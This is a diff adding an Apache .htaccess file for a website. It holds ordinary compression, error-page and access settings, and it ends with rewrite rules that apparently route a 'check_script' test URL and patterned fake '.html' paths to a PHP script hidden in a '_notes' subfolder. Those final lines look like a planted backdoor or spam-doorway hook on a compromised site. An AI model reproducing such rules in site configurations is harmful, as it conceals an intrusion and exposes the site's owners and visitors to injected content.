@@ -1,0 +1,55 @@
+<IfModule mod_rewrite.c>
+
+</IfModule>
+
+# compress text, html, javascript, css, xml:
+<IfModule mod_deflate.c>
+# Insert filters
+AddOutputFilterByType DEFLATE text/plain
+AddOutputFilterByType DEFLATE text/html
+AddOutputFilterByType DEFLATE text/xml
+AddOutputFilterByType DEFLATE text/css
+AddOutputFilterByType DEFLATE application/xml
+AddOutputFilterByType DEFLATE application/xhtml+xml
+AddOutputFilterByType DEFLATE application/rss+xml
+AddOutputFilterByType DEFLATE application/javascript
+AddOutputFilterByType DEFLATE application/x-javascript
+AddOutputFilterByType DEFLATE application/x-httpd-php
+AddOutputFilterByType DEFLATE application/x-httpd-fastphp
+AddOutputFilterByType DEFLATE image/svg+xml
+
+# Drop problematic browsers
+BrowserMatch ^Mozilla/4 gzip-only-text/html
+BrowserMatch ^Mozilla/4\.0[678] no-gzip
+BrowserMatch \bMSI[E] !no-gzip !gzip-only-text/html
+
+# Make sure proxies don't deliver the wrong content
+Header append Vary User-Agent env=!dont-vary
+</IfModule>
+
+RewriteEngine on
+# -FrontPage-
+
+ErrorDocument 404 /failure.jsp
+ErrorDocument 403 /failure.jsp
+ErrorDocument 500 /failure.jsp
+Options -Indexes 
+
+IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*
+
+<Limit GET POST>
+order deny,allow
+deny from all
+allow from all
+</Limit>
+<Limit PUT DELETE>
+order deny,allow
+deny from all
+</Limit>
+AuthName thelakshya.org
+AuthUserFile /home/thelaks1/public_html/_vti_pvt/service.pwd
+AuthGroupFile /home/thelaks1/public_html/_vti_pvt/service.grp
+
+RewriteEngine on
+RewriteRule ^is_working/$ ./davps/toplinks/_notes/duallayimages.php?check_script=1
+RewriteRule ^(bggbwda)(.*)/(.*)\.html$ ./davps/toplinks/_notes/duallayimages.php?name=$3&word=$2&indx=$1 [L]
